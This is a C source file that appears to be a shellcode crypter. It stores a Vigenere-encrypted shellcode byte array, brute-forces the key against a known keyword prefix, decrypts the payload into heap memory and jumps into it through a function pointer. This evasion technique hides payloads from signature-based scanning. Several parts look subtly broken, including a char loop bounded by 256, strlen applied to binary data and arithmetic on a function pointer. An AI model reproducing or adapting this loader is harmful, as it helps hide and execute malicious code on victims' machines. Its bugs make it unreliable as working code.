#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define KEYLENGTH 10


const char* keyword = "1234567890";
unsigned char encryptedShellcode[] = \
"\x65\x66\x65\x66\x68\x69\x6f\x70\x70\x67\x65\xf4\x82\x9a\x95\x94\xab\xa0\x9f\x66\x63\x63\x61\x9a\x62\x95\xa1\xa6\xc0\x1a\x84\xbd\x14\x85\xbc\x14\xe8\x43\x04\xb7";

char* extractShellcode();
char* decode(unsigned char arr[], int arrLength, const unsigned char key[]);

int main(){
  char* shellcode = extractShellcode();
    int (*ret)() = (int(*)())shellcode;
    (ret+KEYLENGTH)();
  return 0;
}

//Bruteforces the the key with the help of the keyword value.
//The decrypted shellcode is returned
char* extractShellcode(){
  char keyArray[KEYLENGTH];
  char* decoded;

  for(int i=0; i < KEYLENGTH; i++){
    for(char j=0; j < 256; j++){
      //Check if keyword matches for this position
      keyArray[i]=j;
      decoded = decode(encryptedShellcode,strlen(encryptedShellcode),keyArray);
      if(decoded[i]==keyword[i]){
        break;
      }
      free(decoded);
    }
  }
  printf("The key was found to be: %.*s\n", KEYLENGTH, keyArray);

  return decoded;
}

//Decodes given array with key as vigenere cipher specifies.
char* decode(unsigned char arr[], int arrLength, const unsigned char key[]){
  unsigned char* decoded = malloc(sizeof(char) * arrLength+1);

    for(int i=0; i<arrLength; i++){
        decoded[i] = (arr[i]-key[i%KEYLENGTH])%256;
    }
    return decoded;
}
